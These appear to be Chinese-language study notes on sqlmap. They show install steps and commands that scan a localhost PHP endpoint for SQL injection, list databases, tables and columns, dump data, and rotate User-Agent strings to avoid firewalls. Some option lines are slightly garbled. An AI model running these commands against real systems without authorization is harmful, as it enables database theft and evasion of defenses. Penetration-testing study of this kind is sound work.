# sqlmap

## 安裝

```bash
sudo apt update
sudo apt install sqlmap
```

## 執行

```bash
sqlmap -u "http://localhost:8080/getcos.php?no=C001" --batch
```

## 常用指令

-- batch # 自動回答 yes
-- dbs # 列出所有資料庫
-- tables -D <database> # 列出指定資料庫中的所有表
-- columns -T <table> # 列出指定表中的所有欄位
-- dump -T <table> -D <database> # 傾印指定表中的所有資料
-- dump-all # 傾印所有資料庫中的所有表中的所有資--no-cast # 不快取

-- fresh-queries # 忽略 sqlmap 儲存在 .sqlmap/output 資料夾中的查詢結果，強制重新向資料庫發送請求。
--flush-session # 清除該目標之前的掃描紀錄，從頭開始偵測。
--random-agent # 隨代更換 User-Agent，避免被 Web 伺服器因快取機制或簡單的防火牆攔截。

## 指定參數

```bash
sqlmap -u "http://localhost:8080/getcos.php?no=C001" --data="no=C001"
```

## 指定 DBMS

```bash
sqlmap -u "http://localhost:8080/getcos.php?no=C001" --dbms=MySQL
```

## 列出資料庫

```bash
sqlmap -u "http://localhost:8080/getcos.php?no=C001" --dbs
```

## 列出指定資料庫中的所有表

```bash
sqlmap -u "http://localhost:8080/getcos.php?no=C001" -D <database> --tables
```

## 列出指定表中的所有欄位

```bash
sqlmap -u "http://localhost:8080/getcos.php?no=C001" -D <database> -T <table> --columns
```

## 列出指定欄位

```bash
sqlmap -u "http://localhost:8080/getcos.php?no=C001" -D <database> -T <table> -C <column> --dump
```
